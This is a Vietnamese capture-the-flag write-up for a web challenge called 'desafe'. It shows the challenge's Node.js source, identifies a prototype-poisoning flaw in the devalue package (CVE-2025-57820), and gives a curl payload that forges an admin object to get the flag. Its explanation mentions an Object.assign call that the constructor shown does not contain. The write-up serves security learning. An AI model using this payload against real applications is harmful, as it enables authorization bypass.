# desafe

Category: Web

Exploitation:

- Yêu cầu: Gửi request POST / với body là một object của FlagRequest với vai trò admin để lấy FLAG

```jsx
class FlagRequest {
  constructor(feedback) {
    // your feedback is greatly appreciated!
    delete { feedback }
  }

  get flag() {
    if (this.admin) {
      return FLAG;
    } else {
      return "haha nope"
    }
  }
}
```

```jsx
app.post('/', async (c) => {
  const body = await c.req.text();

  const flagRequest = devalue.parse(body, {
    FlagRequest: ([a]) => new FlagRequest(a),
  })

  if (!(flagRequest instanceof FlagRequest)) return c.text('not a flag request')

  return c.text(flagRequest.flag)
})
```

→ Có thể suy đoán rằng cần thực hiện Prototype Poisoning để đưa thuộc tính admin về TRUE

- Ứng dụng sử dụng package devalue của npm → Dính CVE-2025-57820
- Dựa vào PoC từ https://github.com/advisories/GHSA-vj54-72f3-p5jv, thực hiện prototype poisoning:

```bash
curl -X POST "https://web-desafe-5jx2f4yn.amt.rs" \
     -H "Content-Type: text/plain" \
     -d '[{"admin":1,"__proto__":2},true,["FlagRequest",3],[4],[]]'
```

- Giải thích:
    
    Đây là một chuỗi `devalue` hợp lệ, thực chất là một mảng lớn. `devalue` sẽ tái tạo các giá trị dựa trên các chỉ mục:
    
    - **`val4` (Index 4):** `[]`
        - Đây là chuỗi `devalue` cho một đối tượng rỗng `{}`.
    - **`val3` (Index 3):** `[4]`
        - Đây là chuỗi `devalue` cho một mảng `[ val4 ]`, tức là `[ {} ]`.
        - Đây chính là mảng `[a]` mà reviver `([a])` mong đợi. `a` sẽ được gán giá trị `{}`.
    - **`val2` (Index 2):** `["FlagRequest", 3]`
        - `devalue` thấy thẻ `"FlagRequest"`. Nó gọi reviver: `new FlagRequest(val3)`.
        - Nó thực thi `new FlagRequest([ {} ])`. Do `([a])` destructuring, `a` = `{}`.
        - `Object.assign(this, {})` chạy thành công.
        - Kết quả của `val2` là một **instance `FlagRequest` hợp lệ**.
    - **`val1` (Index 1):** `true`
        - Giá trị `true` đơn giản.
    - **`val0` (Index 0 - Đối tượng root):** `{"admin":1,"__proto__":2}`
        - `devalue` tạo một đối tượng, gán thuộc tính `admin` trỏ đến `val1` (`true`).
        - Nó gán thuộc tính `__proto__` trỏ đến `val2` (instance `FlagRequest` hợp lệ ).
    
    **Kết quả cuối cùng:** `devalue.parse` trả về `val0`, một đối tượng lai `{"admin": true, __proto__: new FlagRequest({})}`. Đối tượng này vượt qua cả hai vòng kiểm tra và trả về flag
